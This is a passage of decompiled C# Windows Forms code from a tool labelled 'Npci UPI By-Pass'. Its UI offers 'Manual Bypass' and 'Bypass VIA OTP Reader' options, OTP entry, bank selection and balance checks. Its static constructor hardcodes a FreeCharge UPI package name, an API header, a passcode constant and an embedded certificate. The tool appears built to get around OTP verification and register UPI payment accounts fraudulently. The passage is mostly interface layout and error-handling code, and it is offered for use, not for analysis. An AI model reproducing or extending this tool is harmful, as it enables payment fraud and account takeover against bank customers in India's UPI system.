                HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                if (ex.Response != null)
                {
                    try
                    {
                        string text5 = ":";
                        text4 = text5 + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        WebHeaderCollection headers12 = ex.Response.Headers;
                        string name12 = "X-Request-For";
                        if (headers12[name12] != null)
                        {
                            WebHeaderCollection headers13 = ex.Response.Headers;
                            string name13 = "X-Request-For";
                            headers13[name13].ToString().Trim();
                        }
                    }
                    catch
                    {
                    }
                    httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                }
                _reponse = text4;
                string[] array = new string[7];
                string text6 = "<StatusCode>";
                array[0] = text6;
                array[1] = httpStatusCode.ToString();
                string text7 = "</StatusCode>\t<ErrorCode>";
                array[2] = text7;
                array[3] = message;
                string text8 = "</ErrorCode>\t<ResponseCode>";
                array[4] = text8;
                array[5] = text4;
                string text9 = "</ResponseCode>";
                array[6] = text9;
                _Error = string.Concat(array);
                return result;
            }
            catch (Exception ex2)
            {
                _Error = ex2.Message;
                return result;
            }
            finally
            {
                try
                {
                    httpWebResponse?.Close();
                }
                catch
                {
                }
            }
        }
    }

    private void btnClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(NEXUS.APP_FRAMEWORK.frmNPCI));
        this.tabControl1 = new System.Windows.Forms.TabControl();
        this.tb1 = new System.Windows.Forms.TabPage();
        this.label6 = new System.Windows.Forms.Label();
        this.lbl_balance = new System.Windows.Forms.Label();
        this.btn_delete = new System.Windows.Forms.Button();
        this.cbo_Account = new System.Windows.Forms.ComboBox();
        this.btn_login = new System.Windows.Forms.Button();
        this.tb2 = new System.Windows.Forms.TabPage();
        this.txt_pass = new System.Windows.Forms.TextBox();
        this.btnSubmit = new System.Windows.Forms.Button();
        this.pnlQR = new System.Windows.Forms.Panel();
        this.label5 = new System.Windows.Forms.Label();
        this.btnNext = new System.Windows.Forms.Button();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.btnSubmitBank = new System.Windows.Forms.Button();
        this.label4 = new System.Windows.Forms.Label();
        this.cboBankList = new System.Windows.Forms.ComboBox();
        this.chkAuto = new System.Windows.Forms.CheckBox();
        this.chkManual = new System.Windows.Forms.CheckBox();
        this.label3 = new System.Windows.Forms.Label();
        this.txtOtp = new System.Windows.Forms.TextBox();
        this.btn_bypass = new System.Windows.Forms.Button();
        this.mobilenumber = new System.Windows.Forms.TextBox();
        this.label2 = new System.Windows.Forms.Label();
        this.tabPage1 = new System.Windows.Forms.TabPage();
        this.label1 = new System.Windows.Forms.Label();
        this.pnlHeader = new System.Windows.Forms.Panel();
        this.btnClose = new Bunifu.Framework.UI.BunifuImageButton();
        this.B2AAA = new System.Windows.Forms.Label();
        this.tabControl1.SuspendLayout();
        this.tb1.SuspendLayout();
        this.tb2.SuspendLayout();
        this.pnlQR.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        this.tabPage1.SuspendLayout();
        this.pnlHeader.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.btnClose).BeginInit();
        base.SuspendLayout();
        this.tabControl1.Controls.Add(this.tb1);
        this.tabControl1.Controls.Add(this.tb2);
        this.tabControl1.Controls.Add(this.tabPage1);
        this.tabControl1.Location = new System.Drawing.Point(3, 20);
        this.tabControl1.Margin = new System.Windows.Forms.Padding(2);
        this.tabControl1.Name = "tabControl1";
        this.tabControl1.SelectedIndex = 0;
        this.tabControl1.Size = new System.Drawing.Size(310, 199);
        this.tabControl1.TabIndex = 1214;
        this.tb1.Controls.Add(this.label6);
        this.tb1.Controls.Add(this.lbl_balance);
        this.tb1.Controls.Add(this.btn_delete);
        this.tb1.Controls.Add(this.cbo_Account);
        this.tb1.Controls.Add(this.btn_login);
        this.tb1.Location = new System.Drawing.Point(4, 22);
        this.tb1.Margin = new System.Windows.Forms.Padding(2);
        this.tb1.Name = "tb1";
        this.tb1.Padding = new System.Windows.Forms.Padding(2);
        this.tb1.Size = new System.Drawing.Size(302, 173);
        this.tb1.TabIndex = 0;
        this.tb1.Text = "NPCI Login";
        this.tb1.UseVisualStyleBackColor = true;
        this.label6.AutoSize = true;
        this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label6.Location = new System.Drawing.Point(19, 23);
        this.label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label6.Name = "label6";
        this.label6.Size = new System.Drawing.Size(35, 15);
        this.label6.TabIndex = 6;
        this.label6.Text = "Mob";
        this.lbl_balance.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.02597f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.lbl_balance.Location = new System.Drawing.Point(4, 109);
        this.lbl_balance.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.lbl_balance.Name = "lbl_balance";
        this.lbl_balance.Size = new System.Drawing.Size(297, 24);
        this.lbl_balance.TabIndex = 2;
        this.lbl_balance.Text = "0.0";
        this.lbl_balance.TextAlign = System.Drawing.ContentAlignment.TopCenter;
        this.lbl_balance.Visible = false;
        this.btn_delete.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.btn_delete.Location = new System.Drawing.Point(22, 58);
        this.btn_delete.Margin = new System.Windows.Forms.Padding(2);
        this.btn_delete.Name = "btn_delete";
        this.btn_delete.Size = new System.Drawing.Size(95, 29);
        this.btn_delete.TabIndex = 5;
        this.btn_delete.Text = "Delete";
        this.btn_delete.UseVisualStyleBackColor = true;
        this.cbo_Account.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.cbo_Account.FlatStyle = System.Windows.Forms.FlatStyle.System;
        this.cbo_Account.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.cbo_Account.FormattingEnabled = true;
        this.cbo_Account.Location = new System.Drawing.Point(70, 20);
        this.cbo_Account.Margin = new System.Windows.Forms.Padding(2);
        this.cbo_Account.Name = "cbo_Account";
        this.cbo_Account.Size = new System.Drawing.Size(211, 23);
        this.cbo_Account.TabIndex = 0;
        this.btn_login.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.btn_login.Location = new System.Drawing.Point(152, 58);
        this.btn_login.Margin = new System.Windows.Forms.Padding(2);
        this.btn_login.Name = "btn_login";
        this.btn_login.Size = new System.Drawing.Size(129, 29);
        this.btn_login.TabIndex = 1;
        this.btn_login.Text = "Check Balance";
        this.btn_login.UseVisualStyleBackColor = true;
        this.btn_login.Click += new System.EventHandler(btn_login_Click);
        this.tb2.Controls.Add(this.txt_pass);
        this.tb2.Controls.Add(this.btnSubmit);
        this.tb2.Controls.Add(this.pnlQR);
        this.tb2.Controls.Add(this.btnSubmitBank);
        this.tb2.Controls.Add(this.label4);
        this.tb2.Controls.Add(this.cboBankList);
        this.tb2.Controls.Add(this.chkAuto);
        this.tb2.Controls.Add(this.chkManual);
        this.tb2.Controls.Add(this.label3);
        this.tb2.Controls.Add(this.txtOtp);
        this.tb2.Controls.Add(this.btn_bypass);
        this.tb2.Controls.Add(this.mobilenumber);
        this.tb2.Controls.Add(this.label2);
        this.tb2.Location = new System.Drawing.Point(4, 22);
        this.tb2.Margin = new System.Windows.Forms.Padding(2);
        this.tb2.Name = "tb2";
        this.tb2.Padding = new System.Windows.Forms.Padding(2);
        this.tb2.Size = new System.Drawing.Size(302, 173);
        this.tb2.TabIndex = 1;
        this.tb2.Text = "Npci Register";
        this.tb2.UseVisualStyleBackColor = true;
        this.txt_pass.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.txt_pass.Location = new System.Drawing.Point(117, 90);
        this.txt_pass.Margin = new System.Windows.Forms.Padding(2);
        this.txt_pass.Name = "txt_pass";
        this.txt_pass.Size = new System.Drawing.Size(77, 21);
        this.txt_pass.TabIndex = 16;
        this.btnSubmit.Enabled = false;
        this.btnSubmit.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.btnSubmit.Location = new System.Drawing.Point(252, 222);
        this.btnSubmit.Margin = new System.Windows.Forms.Padding(2);
        this.btnSubmit.Name = "btnSubmit";
        this.btnSubmit.Size = new System.Drawing.Size(85, 28);
        this.btnSubmit.TabIndex = 15;
        this.btnSubmit.Text = "Submit OTP";
        this.btnSubmit.UseVisualStyleBackColor = true;
        this.pnlQR.Controls.Add(this.label5);
        this.pnlQR.Controls.Add(this.btnNext);
        this.pnlQR.Controls.Add(this.pictureBox1);
        this.pnlQR.Location = new System.Drawing.Point(306, 0);
        this.pnlQR.Name = "pnlQR";
        this.pnlQR.Size = new System.Drawing.Size(294, 170);
        this.pnlQR.TabIndex = 13;
        this.label5.Location = new System.Drawing.Point(167, 15);
        this.label5.Name = "label5";
        this.label5.Size = new System.Drawing.Size(124, 125);
        this.label5.TabIndex = 10;
        this.label5.Text = "QR Code Mobile ke QrCode Scaner se Scan Karen aur Register Mobile Number se Message Send Karen\r\n\r\nMessage Send Hone ke Baad Next Button ko Click Karen";
        this.btnNext.BackColor = System.Drawing.Color.Brown;
        this.btnNext.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.btnNext.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.btnNext.ForeColor = System.Drawing.Color.White;
        this.btnNext.Location = new System.Drawing.Point(170, 141);
        this.btnNext.Name = "btnNext";
        this.btnNext.Size = new System.Drawing.Size(108, 23);
        this.btnNext.TabIndex = 9;
        this.btnNext.Text = "NEXT";
        this.btnNext.UseVisualStyleBackColor = false;
        this.btnNext.Click += new System.EventHandler(btnNext_Click);
        this.pictureBox1.Location = new System.Drawing.Point(0, 0);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(164, 164);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox1.TabIndex = 8;
        this.pictureBox1.TabStop = false;
        this.btnSubmitBank.Enabled = false;
        this.btnSubmitBank.Location = new System.Drawing.Point(262, 294);
        this.btnSubmitBank.Name = "btnSubmitBank";
        this.btnSubmitBank.Size = new System.Drawing.Size(75, 23);
        this.btnSubmitBank.TabIndex = 14;
        this.btnSubmitBank.Text = "Submit Bank";
        this.btnSubmitBank.UseVisualStyleBackColor = true;
        this.label4.AutoSize = true;
        this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label4.Location = new System.Drawing.Point(75, 268);
        this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(83, 15);
        this.label4.TabIndex = 12;
        this.label4.Text = "Select Bank";
        this.cboBankList.Enabled = false;
        this.cboBankList.FormattingEnabled = true;
        this.cboBankList.Location = new System.Drawing.Point(163, 265);
        this.cboBankList.Name = "cboBankList";
        this.cboBankList.Size = new System.Drawing.Size(174, 21);
        this.cboBankList.TabIndex = 11;
        this.chkAuto.AutoSize = true;
        this.chkAuto.Location = new System.Drawing.Point(129, 14);
        this.chkAuto.Name = "chkAuto";
        this.chkAuto.Size = new System.Drawing.Size(143, 17);
        this.chkAuto.TabIndex = 10;
        this.chkAuto.Text = "Bypass VIA OTP Reader";
        this.chkAuto.UseVisualStyleBackColor = true;
        this.chkManual.AutoSize = true;
        this.chkManual.Location = new System.Drawing.Point(25, 14);
        this.chkManual.Name = "chkManual";
        this.chkManual.Size = new System.Drawing.Size(98, 17);
        this.chkManual.TabIndex = 9;
        this.chkManual.Text = "Manual Bypass";
        this.chkManual.UseVisualStyleBackColor = true;
        this.label3.AutoSize = true;
        this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label3.Location = new System.Drawing.Point(22, 93);
        this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(69, 15);
        this.label3.TabIndex = 6;
        this.label3.Text = "Password";
        this.txtOtp.Enabled = false;
        this.txtOtp.Location = new System.Drawing.Point(170, 226);
        this.txtOtp.Name = "txtOtp";
        this.txtOtp.Size = new System.Drawing.Size(77, 20);
        this.txtOtp.TabIndex = 5;
        this.btn_bypass.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.btn_bypass.Location = new System.Drawing.Point(199, 58);
        this.btn_bypass.Margin = new System.Windows.Forms.Padding(2);
        this.btn_bypass.Name = "btn_bypass";
        this.btn_bypass.Size = new System.Drawing.Size(85, 56);
        this.btn_bypass.TabIndex = 4;
        this.btn_bypass.Text = "By-Pass";
        this.btn_bypass.UseVisualStyleBackColor = true;
        this.btn_bypass.Click += new System.EventHandler(btn_bypass_Click);
        this.mobilenumber.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.mobilenumber.Location = new System.Drawing.Point(65, 59);
        this.mobilenumber.Margin = new System.Windows.Forms.Padding(2);
        this.mobilenumber.Name = "mobilenumber";
        this.mobilenumber.Size = new System.Drawing.Size(129, 21);
        this.mobilenumber.TabIndex = 0;
        this.label2.AutoSize = true;
        this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label2.Location = new System.Drawing.Point(22, 62);
        this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(35, 15);
        this.label2.TabIndex = 3;
        this.label2.Text = "Mob";
        this.tabPage1.Controls.Add(this.label1);
        this.tabPage1.Location = new System.Drawing.Point(4, 22);
        this.tabPage1.Margin = new System.Windows.Forms.Padding(2);
        this.tabPage1.Name = "tabPage1";
        this.tabPage1.Padding = new System.Windows.Forms.Padding(2);
        this.tabPage1.Size = new System.Drawing.Size(302, 173);
        this.tabPage1.TabIndex = 2;
        this.tabPage1.Text = "Help";
        this.tabPage1.UseVisualStyleBackColor = true;
        this.label1.AutoSize = true;
        this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.883117f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label1.Location = new System.Drawing.Point(4, 2);
        this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(181, 75);
        this.label1.TabIndex = 0;
        this.label1.Text = "Help ke Liye Express Official \r\nChannel Join Kare\r\n\r\nChanel join karne ke liye Mobile\r\n se QR Code ko Scan Karen\r\n";
        this.pnlHeader.BackColor = System.Drawing.SystemColors.WindowFrame;
        this.pnlHeader.BackgroundImage = NEXUS.Properties.Resources.titlebar;
        this.pnlHeader.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.pnlHeader.Controls.Add(this.btnClose);
        this.pnlHeader.Controls.Add(this.B2AAA);
        this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
        this.pnlHeader.ForeColor = System.Drawing.Color.FromArgb(17, 17, 18);
        this.pnlHeader.Location = new System.Drawing.Point(0, 0);
        this.pnlHeader.Name = "pnlHeader";
        this.pnlHeader.Size = new System.Drawing.Size(315, 16);
        this.pnlHeader.TabIndex = 1215;
        this.btnClose.BackColor = System.Drawing.Color.Transparent;
        this.btnClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnClose.Dock = System.Windows.Forms.DockStyle.Right;
        this.btnClose.Image = NEXUS.Properties.Resources.controlbutton_close;
        this.btnClose.ImageActive = null;
        this.btnClose.Location = new System.Drawing.Point(301, 0);
        this.btnClose.Name = "btnClose";
        this.btnClose.Size = new System.Drawing.Size(14, 16);
        this.btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.btnClose.TabIndex = 1;
        this.btnClose.TabStop = false;
        this.btnClose.Zoom = 10;
        this.btnClose.Click += new System.EventHandler(btnClose_Click);
        this.B2AAA.AutoSize = true;
        this.B2AAA.BackColor = System.Drawing.Color.Transparent;
        this.B2AAA.Dock = System.Windows.Forms.DockStyle.Left;
        this.B2AAA.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
        this.B2AAA.ForeColor = System.Drawing.Color.Black;
        this.B2AAA.Location = new System.Drawing.Point(0, 0);
        this.B2AAA.Name = "B2AAA";
        this.B2AAA.Size = new System.Drawing.Size(91, 13);
        this.B2AAA.TabIndex = 0;
        this.B2AAA.Text = "Npci UPI By-Pass";
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        base.ClientSize = new System.Drawing.Size(315, 220);
        base.Controls.Add(this.pnlHeader);
        base.Controls.Add(this.tabControl1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "frmNPCI";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "frmNPCI";
        this.tabControl1.ResumeLayout(false);
        this.tb1.ResumeLayout(false);
        this.tb1.PerformLayout();
        this.tb2.ResumeLayout(false);
        this.tb2.PerformLayout();
        this.pnlQR.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        this.tabPage1.ResumeLayout(false);
        this.tabPage1.PerformLayout();
        this.pnlHeader.ResumeLayout(false);
        this.pnlHeader.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.btnClose).EndInit();
        base.ResumeLayout(false);
    }

    static frmNPCI()
    {
        string text = "FdxpaY7gza9PkXUV6e8Qpk4RgvpaVGe8Hxk8fy5LZr5fLJHmYYCQh7tFxgLpJhYztSzUtL3xNbqQnq6Jyx5uEdaXx7fncvbARnL4Kj6Y7zqdNajQyXg8ZHw9EfXFQeLV";
        passCodeConstant = text;
        Jan1st1970 = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
        string text2 = "FREECHARGE_V2";
        freeChargeApiHeader = text2;
        random = new Random();
        LenghtAesKeyBytes = 32;
        rngCsp = new RNGCryptoServiceProvider();
        string text3 = "0123456789ABCDEF";
        hexArray = text3.ToCharArray();
        string text4 = "-----BEGIN CERTIFICATE-----\nMIIErDCCA5SgAwIBAgIKFzMa/spgXyVfATANBgkqhkiG9w0BAQsFADCB9zELMAkG\nA1UEBhMCSU4xRTBDBgNVBAoTPEluc3RpdHV0ZSBmb3IgRGV2ZWxvcG1lbnQgYW5k\nIFJlc2VhcmNoIGluIEJhbmtpbmcgVGVjaG5vbG9neTEdMBsGA1UECxMUQ2VydGlm\neWluZyBBdXRob3JpdHkxDzANBgNVBBETBjUwMDA1NzEXMBUGA1UECBMOQW5kaHJh\nIFByYWRlc2gxKTAnBgNVBAkTIFJvYWQgTm8uMSwgTWFzYWIgVGFuaywgSHlkZXJh\nYmFkMRUwEwYDVQQzEwxDYXN0bGUgSGlsbHMxFjAUBgNVBAMTDUlEUkJUIENBIDIw\nMTQwHhcNMTYwMzMxMTIwMzUyWhcNMTgwMzMxMTIwMzUyWjASMRAwDgYDVQQDEwd1\ncGlucGNpMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsqMattxoTibl\naGsAneFo5TgFfvRltQ2CqteIgUVJlLMz95P35Y+GQc2EOjVEO0L1OUd5IDTIBaqh\nrTqeWypOyna+CsHPqDRY0vsklCYizw/VQkdwLBZHMMhU4jL4wciE7qcf2kdyri6B\n135SzUF5IGPn4SnSkeB3IqHzneUrabP0lJweLF7IU5l9qtpPa6A5cH1iVKQT5YAI\n4NWH+3E/MRNKvdqgU1PILlOEaVB0vJZ1pBWW1aMaecoHfzC8/pTfM2PJ5s/CDbR0\n4xqX9/AYmkt34jMwBKvboyWjD1UgCkPnJd3SaZ4vDpA+nyTITM6uGOI6e6sv/b6v\ntF7nbM3H7wIDAQABo4IBHDCCARgwDgYDVR0PAQH/BAQDAgWgMB0GA1UdDgQWBBQq\nlITKolqdgylQXHZgJ1WJMLhvnDAfBgNVHSMEGDAWgBSAdQI0B9ReDs4FarWs8BBr\nQhsHxzAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwOAYDVR0gBDEwLzAt\nBgZggmRkAgMwIzAhBggrBgEFBQcCAjAVGhNDbGFzcyAzIENlcnRpZmljYXRlMBIG\nA1UdEQQLMAmCB3VwaW5wY2kwWQYDVR0fBFIwUDAkoCKgIIYeaHR0cDovLzEwLjAu\nNjUuNjUvY3JsXzI3QjAuY3JsMCigJqAkhiJodHRwOi8vaWRyYnRjYS5vcmcuaW4v\nY3JsXzI3QjAuY3JsMA0GCSqGSIb3DQEBCwUAA4IBAQB6Y1FmD1GRKdEW4GINYutM\njDxZmHy4HGFmkE3xZjQx9aDT34TpLSNpsg8jUF+nW/KUMb+nWKJuIRZESYfBSCS9\n2fP1AJAO+PKopJMep/weJ+6a0ydPeoKbqKYllTlmFy+DPC56/UuEBQ9iIX3n5RW9\nxZFTB3NFC9A8zhxCBTsxizElrP8Jd4s+I3+qzJIw9ZqGknDgipyYoi0GGx2mjfwH\npg4YQ4/2xjG2ZRQwkgEmcxy/NvbXz1NV5P5u7dit9SwX3gaAZybu2guIcLFcVEvw\n1VpioZlgPjr5RVhyGzX+tBS8rapTNG1C8A7ANLxpk3nqYzNh4XjhMm5EQ3oKDD9d\n-----END CERTIFICATE-----";
        x509CertSecondService = text4;
        string text5 = "com.freecharge.upi";
        packageName = text5;
        string text6 = "Log_ExitF.txt";
        logExitFile = text6;
    }
}
